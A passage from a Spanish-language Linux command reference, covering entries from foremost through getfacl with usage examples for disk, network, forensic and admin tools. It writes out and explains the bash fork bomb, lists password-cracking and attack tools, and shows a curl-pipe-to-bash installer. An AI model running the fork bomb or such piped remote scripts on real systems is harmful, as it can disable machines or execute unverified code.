# dd if=/dev/sda1 of=imagen.iso conv=noerror,sync (Crear la imagen iso del dispositivo a recuperar. “conv=noerror,sync” indica que ignore errores)
# foremost -v -t all -o /home/usuario/recuperado -i imagen.iso
	-v .- modo detallado
	-o .- lugar donde almacenar los archivos recuperados
	-t all .- tipo de archivo a buscar. Para recuperar solo jpg: -t jpg. Para una lista de extensiones: -t jpg,doc,png
	-i .- lugar donde esta la iso a escanear.


forensics-extra
Este paquete proporciona los componentes adicionales para un entorno forense. Todas las herramientas aquí disponibles están basadas en la consola de texto. Ninguna de estas herramientas estaba empaquetada por el equipo de Debian Forensics. Este metapaquete incluye la mayoría de programas de recuperación de datos, búsqueda de rootkit y exploit, sistemas de archivos y análisis de memoria, craker de contraseñas y diccionarios (puestos en /usr/share/dict), desensambladores, acciones especiales sobre el hardware y muchos otras actividades. No existe la intención de proporcionar herramientas para ataques remotos. Paquetes como aircrack-ng se proporcionan para permitir análisis locales sobre archivos pcap. Los paquetes hydra y nmap se pueden usar para encontrar vulnerabilidades dentro de una LAN que está siendo analizada. Este paquete es útil para pentesters, hackers éticos y forenses expertos. Los siguientes paquetes estan incluidos en este metapaquete:
aircrack-ng, bfbtester, binutils, binwalk, bruteforce-luks, bzip2, cabextract, chntpw, clamav, cmospwd, crunch, cryptmount, cupp, dcfldd, disktype, dnsutils, ethstatus, ethtool, exfat-fuse, exfat-utils, exif, exiftags, libimage-exiftool-perl, exiv2, fatcat, fdupes, flasm, foremost, gdisk, geoip-bin, gifshuffle, hashcat, hashid, hexcompare, hexedit, hydra, jdupes, john, lcrack, less, maskprocessor, mc, mdadm, medusa, memstat, mpack, nasm, ncrack, neopi, netcat, nmap, ntfs-3g, ophcrack-cli, outguess, p7zip-full, parted, patator, pcapfix, pdfcrack, poppler-utils (provides pdfinfo), pecomato, pev, polenum, pyrit, rarcrack, samdump2, sipcrack, smb-nat, snowdrop, statsprocessor, stegosuite, stegsnow, sucrack, sxiv, tcpdump, tcpflow, tcpick, tcpreplay, tcpxtract, telnet, testdisk, tshark, uni2ascii, unrar-free, unzip, wamerican, wamerican-huge, wamerican-insane, wamerican-large, wamerican-small, wbrazilian, wbritish, wbritish-huge, wbritish-insane, wbritish-large, wbritish-small, wbulgarian, wcanadian, wcanadian-huge, wcanadian-insane, wcanadian-large, wcanadian-small, wcatalan, weplab, wfrench, wgaelic, wgerman-medical, whois, wifite, wirish, witalian, wmanx, wpolish, wportuguese, wspanish, wswedish, wukrainian, xxd.


fork
[fork bomb]. Consumir los recursos disponibles del sistema, como la CPU y la memoria, hasta el punto en que este queda inutilizable. El comando más representativo asociado a una fork bomb es el siguiente:
      :(){ :|:& };:
Explicación:
    : ----- nombre de la función.
    () { }- define la función sin ningún parámetro.
    :|: --- la función se llama a sí misma y el operador | redirige su salida a una nueva instancia de sí misma.
    & ----- ejecuta las llamadas en segundo plano, permitiendo la creación simultánea de procesos.
    ; ----- separador entre la definición de la función y su ejecución inicial.
    : ----- ejecuta la función, lo que inicia la cascada de procesos.
Una vez en marcha, la fork bomb consume rápidamente los recursos del sistema, bloqueando la capacidad de ejecutar nuevos procesos y usualmente obligando a un reinicio forzado del equipo.


forkstat
Supervisa la actividad fork, exec y exit del proceso.
# forkstat -S -e all (mostrar estadisticas de eventos al final de la ejecución i sobre todos los procesos)
# forkstat -s -d (información breve del nombre del proceso sin mostrar la ruta)


fortune
Mostrar frases aleatorias.
$ fortune
$ fortune -l (muestra citas largas)
$ fortune -s (citas cortas)
$ fortune -o (citas obscenas)
Si queremos que al abrir la terminal muestre la fecha, añadir al final de /home/usuario/.bashrc:
	fortune -a date
Las frases se encuentran en /usr/share/games/fortune


fortune-anarchism
Proporciona un conjunto de citas anarquistas en inglés en el formato de base de datos de fortune.


fping
Determina máquinas de una red activas
# fping -g 192.168.2./24 2> /dev/null | grep alive


fpzip
Utilidad para la compresión sin pérdida y opcionalmente con pérdida de matrices de punto flotante 2D y 3D. fpzip asume datos escalares correlacionados espacialmente, como funciones continuas muestreadas regularmente, y no es adecuado para comprimir secuencias no estructuradas de números de punto flotante.
$ fpzip -i entrada.dat -o salida.fpzip (forma básica)
$ fpzip -d comprimido.fpzip -o descomprimido.dat (descomprimir)
$ fpzip -i entrada.dat -o salida.fpzip -p 4 (comprimir con un nivel de precisión de 4)
$ fpzip -v salida.fpzip (mostrar información sobre el archivo comprimido)
$ fpzip -i entrada.dat -o salida.fpzip -H (comprimir archivos muy grandes que no caben  memoria y que se debe incluir la cabecera en el archivo de salida)


francine
Programa de inicio de sesión que se basa en el archivo de configuración /etc/francine.sl. Adicionalmente, para comprobar la autenticación de inicio de sesión se utilizan los archivos del directorio /etc/securetty/. Este programa no acepta ninguna opción.
# nano /etc/francine.sl
       % la mayoría de las entradas de configuración son modificadores; 1 significa sí (o verdadero),
       % 0 significa no (o falso).
       %
       % establece si se debe evaluar /etc/securetty.
       support_securetty = 1;
       %
       % establece si se debe establecer un entorno $PATH estándar.
       % activarlo significa un mejor cumplimiento del inicio de sesión estándar.
       set_path_env = 1;
       %
       % establece si se debe verificar el buzón del sistema para ver si hay correo electrónico nuevo.
       check_email = 1;
       %
       % establece si se debe admitir la salida de voz a /dev/speech.
       speech_support = 0;
       %
       % establece el dispositivo de voz (predeterminado: /dev/speech)
       % set_speech_device("/dev/speech");
       %
       % establece la cantidad de segundos después de los cuales francine debe expirar.
       % 0 significa que no hay tiempo de espera.
       timeout = 0;
       %
       % establece otra cadena de introducción (la cadena que se imprime durante 1 segundo
       % al iniciar el programa).
       % set_intro_string("¡Bienvenido al pc Deb!\n");
       %
       % establece el directorio del tema (predeterminado: /usr/share/francine/default.theme).
       % modifica esto si instalaste otro tema.
       set_theme_dir("/usr/share/francine/default.theme");
       %
$ francine (prueba sin efecto real)


free
Listar la memoria RAM y swap utilizada y disponible
$ free -m (muestra los resultados en megabytes)


freeradius
[libssl-dev freeradius-mysql freeradius-utils]. Servidor.
Configurar la base de datos:
# nano /etc/freeradius/sites-enabled/default
En los apartados "authorize" y "accouting" descomentar las lineas sql
# nano /etc/freeradius/radius.conf
Descomentar la linea $INCLUDE sql.conf
Configurar usuario, contraseña y mensaje de bienvenida:
# nano /etc/freeradius/users
USUARIO Cleartext-Password := "CONTRASEÑA"
        Reply-Message "Entrando en el servidor el usuario %{User_Name}"
Configurar usuario y contraseña del router o punto de acceso:
# nano /etc/freeradius/clients.conf
client 192.168.1.0/24 {
	secret		= CONTRASEÑA_ROUTER
	shortname	= USUARIO_ROUTE
Finalmente entrar en router y colocar la ip del equipo donde hemos instalado el servidor. Reiniciar el servicio.
# /etc/init.d/freeradius restart
# freeradius -X (Arrancar em modo debug)
# radtest USUARIO testing 127.0.0.1 1812 testing123 (Testear si la configuración de un usuario está correcta)


freshclam
[clamav-freshclam]. Actualizar la base de datos de virus. Ver clamav


fsarchiver
Es una herramienta similar a partimage para crear imágenes de una o varias particiones a la vez a un fichero asi como restaurar dichas imágenes más tarde.
# fsarchiver savefs /data/imagen.fsa /dev/sda1 (creamos la imagen de la partición).
# fsarchiver savefs /data/imagen2.fsa /dev/sda1 /dev/sdb1 (creamos la imagen de dos particiones simultaneamente que seran almacenadas en el mismo fichero).
# fsarchiver restfs /data/imagen2.fsa id=0,dest=/dev/sda1 (restauramos la primera partición de la imagen).
# fsarchiver restfs /data/imagen2.fsa id=1,dest=/dev/sdb1 (restauramos la segunda partición).
# fsarchiver restfs /data/imagen2.fsa id=0,dest=/dev/sda1 id=1,dest=/dev/sdb1 (restauramos a la vez las dos particiones).


fscache
[cachefilesd]. Administrador de almacenamiento en caché genérico en el núcleo de Linux que puede ser utilizado por sistemas de archivos de red y otros para almacenar datos en caché de forma local. Esta funcionalidad se utiliza en conjunción con sistemas de archivos específicos como AFS, NFS, y Ceph, que pueden beneficiarse del almacenamiento en caché local.
# rm -rf /var/cache/fscache/* (limpiar caché)
# systemctl status cachefilesd (verificar si está activo)


fsck
[recomendado dosfstools]. Reparar/chequear/formatear una partición no montada.
# fsck -fy /dev/hda1
# fsck.ext2 -vpf /dev/hda1 (Repara una partición ext2)
# fsck.ext3 -vpf /dev/hda1 (Repara una partición ext3)
# fsck -fpC 0 /dev/sda1
# fsck.ext4 -cDfty -C 0 /dev/sda1
# fsck.ext4 -vpf /dev/sda1 (Muestra información sobre una partición: fragmentación, inodos, bloques, archivos...)
# fsck.vfat -w -r -l -a -v -t (Reparar particion FAT32 con dirty bit activado)
Opciones:
	-A .- Permitira una navegación en toda la estructura de /etc/fstab.
	-V  .- información adicional sobre las acciones de fsck
	-t   .- Imprimir estadísticas de estado (-tt para más información)
	-a .- Repara cualquier problema que encuentra en el sistema de archivos sin preguntar (no recomendada)
	-l .- Lista todos los nombres de archivos
	-r .- Pide confirmación antes de reparar el sistema de archivos.
	-s .- Lista el superblock antes de chequear el sistema de archivos.
	sis_arch .- Especifica el sistema de archivos a verificar
	-c .- Buscar bloques dañados con badblocks (ver badblocks)
	-k .- Bloques dañados donde se almacenan con el comando anterior.
	-C 0 .- Muestra barra de progreso.
	-p .- forzar verificación y reparar automaticamente errores
	-D .- Obtimizar directorios si es posible
	-f   .- Forzar el chequeo incluso si el sistema de archivos parece correcto
	-Y   .- Asume respuesta "yes" a todas las preguntas
1.-
Autoreparación de errores al arrancar:
# nano /etc/default/rcS
Y modificar la linea:
FSCKFIX=yes


fspy
Herramienta de monitorización de la actividad de un sistema de archivos.
# fspy /home/usuario


fstab
(/etc/fstab). Lista todos los discos y particiones disponibles e indica cómo deben ser inicializados. Su estructura es:
* Particion punto_de_montaje sistema_de_archivos opciones respaldos orden
Y un ejemplo seria:
	/dev/sda5 /media/datos ext4 rw,users,exec,auto 0 0 (especificando el número de partición)
	UUID=0e4d9ccb-93bb-4762-8b67-c23d181fc84a / ext4 errors=remount-ro 0 1 (especificando el UUID de la partición)
Los puntos de montaje han de existir en el sistema y normalmente se colocan en /media
Algunos sitemas de archivos puede ser:
	auto (intenta descubrir automáticamente el sistema de archivos).
	ext2 (sistema de archivos común en Linux).
	ext3 (igual que ext2 pero además añade journaling).
	ext4 (introdujo significativas mejoras respecto a ext3)
	reiserfs (otro sistema muy común en Linux)
	msdos (para dispositivos que usen FAT16)
	vfat (para dispositivos que usen FAT32).
	ntfs (sistema de archivos NTFS de Windows)
	smbfs (sistema de archivos de Samba).
	nfs (sistema de archivos de red NFS)
Algunas opciones:
	auto (el dispositivo será montado automáticamente durante el inicio. auto es el valor por defecto)
	noauto (Si no se desea que el dispositivo se monte automáticamente)
	exec (permite ejecutar binarios que están en la partición)
	noexec (lo impide. ütil en particiones windows)
	ro (Montar sólo lectura)
	rw (Montar para lectura/esctritura)
	user (Permite a cualquier usuario montar el sistema de archivos)
	nouser (Solo el usuario root podrá montar el sistema de archivos)
	defaults (Utiliza las opciones por defecto: rw,exec,auto,nouser)
Respaldo. Es el comando que utiliza dump para hacer respaldos del sistema de archivos. Cero desactiva la opción.
Orden. indica el orden en que la aplicación fsck revisará la partición en busca de errores durante el inicio, si es cero el dispositivo no se revisa.


fswebcam
Capturas con la webcam.
$ fswebcam --crop 200x100 --save out (Especificando medidas y archivo de salida)
$ fswebcam -r 600x500 out1.jpeg --greyscale out2.jpeg (Dos capturas, especificando resolución y la otra en escala de grises)
$ fswebcam --banner-colour "#FF0000" --save out (Con el baner de color rojo)
Algunas opciones:
	-d  (Especificar el dispositivo de video. Por defecto /dev/video0)
	--no-banner (Que la captura no muestre el baner. Por defecto sale en la parte inferior)
	--top-banner (Que el baner salga en parte superior)
	--title "linux es genial" (Mostrando un texto en el baner)
	--timestamp "%d-%m-%Y" (Mostrando en el baner la fecha en formato dia-mes-año)
	--info "Linux es un sistema genial" (Añadir un texto que se muestra debajo de la fecha con letra más pequeña)
	--invert (Haciendo un negativo de la imagen)


fte
Editor. Según se lance desde las X o por consola se usará fte, xfte o sfte. F1 muestra todos los atajos y se accede a los menús de forma clásica con Alt+f...


ftff
[whichman]. Busca archivos o directorios
$ ftff -t2 logfile.txt (busca  logfile con dos errores en el nombre. permite asterisco [*])


ftp
Conexión remota por linea de comandos
# ftp -help (Para obtener ayuda)
# ftp -u usuario,clave ftp.dominio.com (Para conectarnos con un servidor)
# ftp dominio.com 20201 (Entrar especificando un puerto)
Al entrar en el directorio raiz del servidor ftp remoto con un prompt al estilo de:
ftp usuario@ftp.dominio.com:~>
Algunas opciones:
	get archivo (Recibir un fichero de la máquina remota)
	mget file file file (Recibir varios ficheros de la máquina remota.
	put archivo (Enviar un fichero desde nuestra máquina a la máquina remota)
	mput file file file (Enviar varios archivos de nuestra máquina a la máquina remota)
	quit (Para desconectarnos del servidor)
	!ls (Ejecuta una shell que permite la entrada de comandos [ls] en nuestro sistema. Con "exit" volveremos al programa de FTP)
	!xterm & (Lanzaría otra xterm)
	bell (Indica al sistema que ejecute un pitido cuando finalice la ejecución de los comandos)
	bye (Termina la ejecución de ftp)
	quit (Termina la ejecución de ftp)
	close (Termina la sesión ftp sin salir del programa)
	delete file (Borra un archivo)
	mdelete file file file (Borra varios archivos)
	reget file(Continuar bajando un fichero cortado anteriormente)
	open (conectar desde un ftp a otro)
	? (Muestra todos los comandos disponibles)
	cd, dir, ls, list, mkdir, rmdir, pwd, rename (Funionan igual que en la shell)


funcoeszz
Conjunto de 65 funciones y utilidades varias. Una vez instalado:
$ funcoeszz zzzz --bashrc (Para colocar las lineas en .bashrc)
	# Instalacao das Funcoes ZZ (www.funcoeszz.net)
	source /usr/bin/funcoeszz
	export ZZPATH=/usr/bin/funcoeszz
$ source .bashrc (Releer el fichero)
$ funcoeszz zzzz (listado de los 65 funciones)
$ funcoeszz zzzz --teste (Comprobar que todos los ejecutables que necesita la aplicación estan instalados)
$ funcoeszz zzzz --atualiza (Baja las últimas versiones de las funciones)
$ funcoeszz ajuda (Ayuda muy util sobre como usar cada un de las funciones)
$ funcoeszz ascii (Lanzar una de las funciones del listado)


funzip
Muestra los datos de un archivo comprimido en zip o gz.
$ funzip archivo.zip
$ funzip -contraseña archivo.gz (En caso de tener contraseña. No es muy aconsejable porque queda en el history)


fuse
[Filesystem in Userspace] Permitir montajes seguros para que los usuarios sin privilegios creen y monten sus propias implementaciones de sistemas de archivos.
$ fuse /home/USER/archivos /mnt/files (montar un sistema de archivos)
$ fusermount -u /mnt/files (desmontar)
$ df -T | grep fuse (verificar el estado del montaje)
$ fuse -o allow_other /home/USER/archivos /mnt/files (permite acceso a todos los usuarios)
Nota.- Para usar "-o" ha de descomentarse user_allow_other en /etc/fuse.conf
$ fuse -s allow_other /home/USER/archivos /mnt/files & (ejecutar en segundo plano)
1.- Para que los usuarios sin privilegios puedan acceder a todas las funciones:
# nano /etc/fuse.conf
Y descomentar:
user_allow_other


fuse-zip
Sistema de archivos FUSE para navegar, extraer, crear y modificar archivos ZIP como si fueran directorios reales.
$ fuse-zip archive.zip /mnt/zipfs (montar el archivo ZIP en /mnt/zipfs)
$ fusermount -u /mnt/zipfs (desmontar)
$ ls /mnt/zipfs (listar contenido)
$ cp /mnt/zipfs/file.txt /tmp/ (extraer un archivo y dejarlo en /tmp)
$ echo "Nuevas cosas..." >> /mnt/zipfs/nuevo_file.txt (añadir nuevo archivo al zip)
$ rm /mnt/zipfs/nuevo_file.txt (eliminar un archivo de un zip)
$ mv /mnt/zipfs/original.txt /mnt/zipfs/nuevo_nombre.txt (renombrar un archivo de un zip)


fuser
Cerrar particiones rebeldes, saber aplicaciones que corren en un puerto...
$ fuser -km /media/sda6     (Mata todos los procesos de la partición especificada. Luego desmontarla normal con umount)
$ fuser -n tcp 3389  (indica PID que corre en el puerto 3389)
$ fuser -k 80/tcp   (cerrar todo el tráfico tcp del puerto 80)
$ fuser -v archivo  (Muestra los procesos usados por un fichero o directorio)
# fuser -n tcp -s 22 && echo "abierto" (Indica si un puerto está abierto)


fusermount
[Filesystem in Userspace-FUSE]. El sistema de archivos en el espacio de usuario [FUSE] es un método seguro para que usuarios sin privilegios creen y monten sus propias implementaciones de sistemas de archivos.
# fusermount -o /media/punto_montaje (montar un sistema de archivos)
# fusermount -z /media/punto_montaje (Desmontar el sistema de archivos tan pronto como deje de usarse)
# fusermount -u /media/punto_montaje (Desmonta un sistema de archivos)


fwanalog
Analiza y resume los archivos de registro del firewall.
# fwanalog /ruta/al/firewall.log (analizará el archivo firewall.log y generará un informe en HTML para abrir con el navegador)


fwlogwatch
Analizador de registros. Los mensajes en /var/log/messages y la configuración en /etc/fwlogwatch.config en el que se han de descomentar los conceptos que interesen aunque muchos se pueden habilitar lanzando la aplicacion con argumentos. Incluye los ejecutables fwlw_notify y fwlw_respond. Un ejemplo de configuración:
           stateful_start = yes
           bind_to = 127.0.0.1
           listen_port = 888
           show_log_times
# fwlogwatch
# fwlogwatch -w -o log.html
# fwlogwatch -v -b -t -e -z -w -o fwlogw.html
# fwlogwatch -v -n -N -b -t -e -z -w -o fwlogw.html


fwsnort
Traduce las reglas de Snort en reglas de iptables equivalentes y genera un script de shell que implementa los comandos de iptables resultantes. La generación de scripts en modo de registro, los errores de análisis escritos en el archivo de registro de fwsnort y la verificación de políticas de iptables están habilitados de forma predeterminada sin tener que especificar ningún argumento de línea de comando.
# fwsnort (traducir las reglas de Snort)
# fwsnort -6 (Generar reglas de ip6tables para ataques a través de IPv6)
# fwsnort --include-type ddos,backdoor (Generar reglas de iptables solo para ddos y backdoors)
# fwsnort --snort-sid 2008475,2003268 (Genere reglas de iptables para los ID de Snort 2008475 y 2003268 (de emergente-all.rules))
# fwsnort --restrict-intf eth0,eth1 (indicar que solo inspeccione el tráfico eth0 y eth1)
# fwsnort --ipt-sync --verbose (Generar reglas de iptables para Snort que estan permitidas por la política local de iptables y escribir las de snort originales en el script de iptables como comentario)


fwupd
Demonio que permite que el software de sesión actualice el firmware del dispositivo.
# fwupdmgr get-devices (mostrar todos los dispositivos detectados)
# fwupdmgr refresh (descargar metadatos recientes del Linux Vendor firmware Service [Servicio de firmware del proveedor de Linux]-LVFS)
# fwupdmgr get-updates (enumerar las actualizaciones disponibles para cualquier dispositivo en el sistema)
# fwupdmgr update (instalar actualizaciones)
# fwupdmgr report-history (enviar información a los administradores de LVFS y a los desarrolladores OEM sobre la eficacia del proceso de actualización del firmware)
fwupd-test


fzf
[buscador difuso "fuzzy finder"]. Realizar búsquedas en cualquier tipo de listas que se le ofrezca como entrada, ya sean archivos, historial de comandos o procesos.  Descarga e instalación [preferible a la de los repositorios de la distro]:
$ curl -o- https://raw.githubusercontent.com/junegunn/fzf/master/install | bash
$ fzf (lanza la aplicación de forma básica)
$ history | fzf (abre una interfaz interactiva donde puedes buscar y seleccionar un comando anterior en el historial)
$ ls | fzf (buscar y seleccionar archivos en el directorio actual)
$ ps aux | fzf (muestra los procesos activos y permite buscar o seleccionar uno)
$ find . -type f | fzf (con find, buscar y seleccionar archivos en subdirectorios)
$ find . -name "*.sh" | fzf (encontrar archivos por extensión)
$ git checkout $(git branch | fzf) (muestra una lista de ramas y permite buscar la que se quiere cambiar)


gawkbug
Es un script de shell para ayudar al usuario a redactar y enviar informes de errores relacionados con gawk en un formato estándar. gawkbug invoca el editor especificado por la variable de entorno EDITORs.
$ gawkbug (El usuario debe completar los campos correspondientes y salir del editor)
$ gawkbug correo (envía por correo el informe completo a bug-gawk@gnu.org, o a la dirección de correo que se especifique)
Nota.-  Si el informe no se puede enviar por correo, se guarda en el archivo dead.gawkbug en el directorio del usuario que invoca.


gawk-doc
Información en inglés del comando gawk. Acceder a la misma con el navegador con la dirección:
	file:///usr/share/doc/gawk-doc/gawkworkflow-html/index.html


gcalccmd
Calculadora.
$ gcalccmd (Entra en el prompt y se teclea por ejemplo 5*4 y dará el resultado)


gcalctool
Calculadora.
$ gcalctool -s 5*4/2+5


gcc
(GNU Compiler Collections). Compilador de lenguaje C y C++.
$ gcc source.c (compilará source.c y creará el archivo a.out de salida)
$ gcc -c archivo.c (genera una biblioteca)
$ gcc programa.c -o programa_compilado (crea el ejecutable)
$ gcc -x c archivo (Especificando el lenguaje para compilar [c])
$ gcc source.c -W -o linux (Compilará mostrando advertencias y errores y creará la salida linux)
Nota.-la ejecución de la salida será de forma clásica en linux: ./linux


gconftool-2
[gconf-editor]. Configurador de todos los parámetros de gnome
$ gconftool-2 --dump / > gconf_backup.xml  (realizar copia de seguridad de la configuración)
$ gconftool-2 --load gconf_backup.xml /  (restablecer la copia de seguridad)
$ gconftool-2 --recursive-unset /apps/panel (recuperar los paneles originales)
nota.- sustituiendo el “/apps/panel” por cualquier ruta del árbol de directorios [por ejemplo “/”] de gconf-editor pueden restaurarse sus valores originales
$ rm -rf .gconf/apps/panel (borra toda la configuración extra de los paneles)
$ gconftool-2 –shutdown && rm -rf ~/.gconf/apps/panel && pkill gnome-panel (velver a una configuración anterior de los paneles)
Notas:
	-t (tipo de datos a utilizar. Los valores son {int|bool|float|string|list|pair})
	-s (entrada a modificar)
Los valores de –type pueden ser:
lógicos [bool]. Cuando el parámetro puede ser verdadero [true] o falso [false]. P.e quitar papelera del escritorio:
$ gconftool-2 -t bool -s /apps/nautilus/desktop/trash_icon_visible false
Enteros (int). Cuando ha de especificarse un número. P.e. aumentar el numero de escritorios a 5:
$ gconftool-2 -t int -s /apps/metacity/general/num_workspaces 5
reales (float). Cuando el valor tiene el punto como separador decimal. p.e el contraste de cheese:
$ gconftool-2 -t float -s /apps/cheese/contrast 1.2
Cadenas (string). Cuando ha de especificarse un texto. P.e. cambiar el nombre de la carpeta de usuario:
$ gconftool-2 -t string -s /apps/nautilus/desktop/home_icon_name "Mi carpeta"
Lista de valores (list). En muchos casos va complementado con otra lista (--list-type) que admite los valores {int|bool|float|string}. p.e detectar codificación en gedit con determinadas opciones:
$ gconftool-2 -t list --list-type string -s /apps/gedit-2/preferences/encodings/auto_detected [UTF-8,CURRENT,ISO-8859-15,UTF-16]
Parejas de valores [pairs]. Indica parejas de valores de los tipos anteriores. No he encontrado ningún ejemplo


gcp
Copiar archivos y directorios mostrando barra de progreso.
$ gcp archivo dir (Copiar un archivo en un directorio)
$ gcp file1 file2 file3 dir (Copiar varios archivos en un directorio)
$ gcp -r dir1 dir2 (Copiar de forma recursiva)
$ gcp -f -r dir1 dir2 (Copiar forzando sopbreescritura si ya existe el archivo)


gdb
Herramienta para depurar programas en C y C++
Necesitamos que el programa haya sido compilado con modo debug (parámetro -g) en gcc o g++
$ gdb /ruta/programa (Con esto abrimos la shell de GDB)
Dentro de la Shell de GDB podemos ejecutar comandos
(gdb) run (ejecutara el programa sin argumentos)
(gdb) run < content.xml > test.txt (Con argumentos, ejemplo de o3totxt)
(gdb) break 10 (Decimos a GDB que queremos un punto de control en la linia 10 del código)
(gdb) print variable (También p. Nos printara el contenido de la variable)
(gdb) continue (Tambien c. Decimos que el programa continue ejecutándose)
(gdb) next 	(También n. Ejecuta la siguiente linia de código)
(gdb) step (También s. Lo mismo que next pero si la siguiente linia es una función, va a dicha función y ejecuta linia a linia el código de esa función)
(gdb) [TECLA_ENTER] (Repite el paso anterior)
(gdb) backtrack (Printa la traza inversa)
(gdb) help (ayuda del programa)
(gdb) quit (salimos del programa)


gdebi
Instalador de paquetes .deb
# gdebi paquete.deb


gdisk
Herramienta para particionar discos rígidos de cualquier tamaño con una tabla de particiones GPT de GUID (Globally Unique Identifier) imprescindible para los discos mayores de 2 TB. Para el caso de discos rígidos SSD, por defecto gdisk asegura que sus particiones estén correctamente alineadas [discos duros que no tienen 512 bytes por sectors]. El uso de particiones GPT, elimina la necesidad de basarse en particiones primarias, extendidas o lógicas propias del sistema MBR. GPT puede soportar un número casi ilimitado de particiones y tiene solamente el límite de la cantidad de espacio reservado para las entradas de las particiones en el disco GPT, por defecto gdisk tiene un límite 128 particiones.
# gdisk /dev/sda
Algunos comandos:
	i (información de las particiones)
	l (listar particiones)
	m (volver al menú principal)
	d (borrar partición)
	n (crear nueva partición)
	o (crear nueva tabla de particiones GUID)
	t (cambiar tipo de partición)
	c (cambiar de partición)
	q (salir guardando los cambios)
	? (mostar menú de opciones)


gdm
Pantalla de login para entrar en el sistema
1-
Para ocultar usuarios:
Aparecen en la pantalla de login los que tienen un ID 1000 o superior. Para conocer los ID:
# cat /etc/passwd | gawk -F: '{print $3, $1}' | sort -n
Para suprimirlos:
# nano /etc/gdm/custom.conf
Y el apartado greeter dejarlo:
[greeter]
Exclude=usuario_a_ocultar,boinc,yacy
2.-
Entrada automática y otros ajustes:
# gdmsetup
3.-
Cambiar fondo en la pantalla de login.
# nano /etc/gdm3/greeter.gsettings
Y modificando la linea "pictori-uri" para que apunte a la imagen deseada:
	[org.gnome.desktop.background]
	picture-uri='file:///path/a/fondo'
	picture-options='zoom'
Una vez modificado, aplicar los cambios con:
# dpkg-reconfigure gdm3


gedit
Editor de texto
$ gedit --list-encodings  (Lista la codificación de caracteres)
$ gedit --encoding UTF-8 archivo.txt  (Abre el archivo mencionado con la cofificación especificada)
Atajos
	Ctrl+c (Copiar)
	Ctrl+s (Guarda documento)
	Ctrl+v (Pegar)
	Ctrl+x (Cortar)
	Ctrl+w (Cerrar ventana activa)
	Ctrl+Mayús+flecha  (seleccionar texto a derecha o izquierda)


gelemental
Muestra la tabla periódica de los elementos quimicos.


gem
[rubygems]. Nombre que reciben los módulos en ruby.
$ gem install rake (Instalar. "Rake" en este caso)
$ gem install rake --remote (Instalar desde un servidor remoto)
$ gem list --local (Muestra las gemas instaladas)
$ gem list R (Lista las gemas cuyo nombre empieza por "R")
$ gem search rake (Buscar una gema)
$ gem search --both mysql (Busca entre las gemas locales o remotas las que contengan "mysql")
$ gem search --remote mysql (Busca entre las gemas remotas las que contengan "mysql")
$ gem help (Información de todas las gemas)
$ gem help push (Muestra información sobre un comando. "push" en este caso)
$ gem content rake (lo que instalo una gema en el sistema)
$ gem uninstall rake (Desinstalar "rake")
$ gem environment (Información sobre rubygems)
$ gem update (Actualizar todas las gemas del sistema)


gemsets
Conjunto de gemas que definimos para una determinada versión de Ruby [ver] y que están aislados entre ellos. O sea, si tenemos dos proyectos y cada uno con una versión distinta, no tienen conflicto entre ellos. Por tanto, lo más recomendable es definir un gemset para cada proyecto en el que estemos trabajando. Ver rvm.


genius
Calculadora.
$ genius (Entra en el prompt. Su uso en el clásico: 60*2, 100/5... exit para salir)
$ genius –exec=50/2


geoiplookup
[geoip-bin geoip-database-contrib]. Localiación geográfica de una ip.
$ geoiplookup IP
# geoip-database-contrib_update (actualizar la BD [/usr/share/GeoIP/])


geoipupdate
Actualiza las bases de datos GeoIP2 y GeoIP Legacy para clientes de MaxMind. El programa se conecta al servidor de actualización MaxMind GeoIP para buscar nuevas bases de datos. Si hay una nueva base de datos disponible, el programa la descargará e instalará.
# geoipupdate
Nota.- En el archivo de configuración se ha reemplazar YOUR_ACCOUNT_ID_HERE y YOUR_LICENSE_KEY_HERE por una combinación de clave de licencia e ID de cuenta activa asociada con su cuenta de MaxMind. Estos números están disponibles en https://www.maxmind.com/en/my_license_key y descomentar las lineas:
# nano /etc/GeoIP.conf
  AccountID YOUR_ACCOUNT_ID_HERE
  LicenseKey YOUR_LICENSE_KEY_HERE


geolooc
[weboob (Ver)]. Geolocalizar direcciones ip. Precisa módulo ipinfodb activado (ver weboob)
$ geolooc 8.8.8.8
	id: 8.8.8.8@ipinfodb
	city: MOUNTAIN VIEW
	region: CALIFORNIA
	zipcode: NA
	country: US
	lt: 37.405992
	lg: -122.078515
	host: google-public-dns-a.google.com
	tld: com


get-iab
[arp-scan]. Recupera el archivo IAB de Ethernet del sitio web IEEE [<https://standards.ieee.org/>] y lo guarda en el formato utilizado por arp-scan. El archivo IAB contiene todos los IAB (bloques de direcciones individuales) que se han registrado con IEEE.
# get-iab -v
# get-iab -f iab.txt (que escriba el resultado en el archivo especificado. Por defecto en ieee-iab.txt)


getkeycodes
Muestras las tablas de asignación scancode y keycode del núcleo.
$ getkeycodes


get-oui
[arp-scan]. Recupera el archivo OUI de Ethernet del sitio web IEEE [<http://standards.ieee.org>] y lo guarda en el formato utilizado por arp-scan. El archivo OUI contiene todos los OUI (identificadores únicos de la organización) que se han registrado con IEEE.
# get-oui -v
# get-oui -f oui.txt (que escriba el resultado en el archivo especificado. Por defecto en ieee-oui.txt)


getcap
Buscar archivos con capabilities y que son  las funcionalidades que pueden asignarse a un ejecutable y que muchas veces pueden otorgar permisos demasiado altos durante la ejecución de dicho programa. Con "man capabilities" obtendremos un listado de las capabilities implementadas y las operaciones o comportamientos que permite cada una. [entrada relacionada con setcap]
$ getcap -r / 2>/dev/null (de forma recursiva)
$ getcap -v  /usr/bin/ping (permite mostrar las capabilitys otorgadas)


getconf
Consulta las variables de configuración del sistema.
$ getconf -a (Muestra el listado)
$ getconf LONG_BIT (Informa sobre si se trata de un equipo de 32 o 64 bits)


getenforce
Comprobar el estado de selinux.
# getenforce
Estados posibles
enforcing [impositivo] (Política de seguridad activa)
permissive [permisivo] (Registra los eventos pero no impone la política)
disabled [inhabilitado] (Desactivado)
# nano /etc/selinux/config
	# This file controls the state of SELinux on the system.
	# SELINUX= can take one of these three values:
	# enforcing - SELinux security policy is enforced.
	# permissive - SELinux prints warnings instead of enforcing.
	# disabled - No SELinux policy is loaded.
	SELINUX=permissive
	# SELINUXTYPE= can take one of these two values:
	# default - equivalent to the old strict and targeted policies
	# mls     - Multi-Level Security (for military and educational use)
	# src     - Custom policy built from source
	SELINUXTYPE=default
	# SETLOCALDEFS= Check local definition changes
	SETLOCALDEFS=0


getent
Obtiene entradas de la base de datos administrativa (ahosts, passwd, group, hosts, services, protocols, networks, aliases y rpc)
$ getent passwd (lista los usuarios creados en el sistema)
$ getend group users (Ver los usuarios del grupo users)
$ getent services 22 (Muestra el servicio que corre por el puerto especificado. Si no se especifica puerto los lista todos)


getfacl
